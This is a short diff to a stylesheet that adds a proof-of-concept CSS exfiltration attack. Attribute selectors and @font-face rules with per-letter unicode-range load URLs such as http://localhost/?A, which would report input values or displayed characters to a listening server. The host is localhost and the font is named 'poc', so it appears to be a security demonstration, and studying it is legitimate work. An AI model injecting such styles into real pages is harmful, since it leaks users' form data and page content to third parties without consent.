@@ -3,8 +3,25 @@
   border:5px solid black;
   color: red;
   font-weight: bold;
+  font-family:poc;
 }
 
 input[id=p][value^=1]{
     background-image: url(https://localhost/1);
+}
+
+@font-face{
+ font-family:poc;
+ src: url(http://localhost/?A); 
+ unicode-range:U+0041;
+}
+@font-face{
+ font-family:poc;
+ src: url(http://localhost/?B); 
+ unicode-range:U+0042;
+}
+@font-face{
+ font-family:poc;
+ src: url(http://localhost/?C); 
+ unicode-range:U+0043;
 }
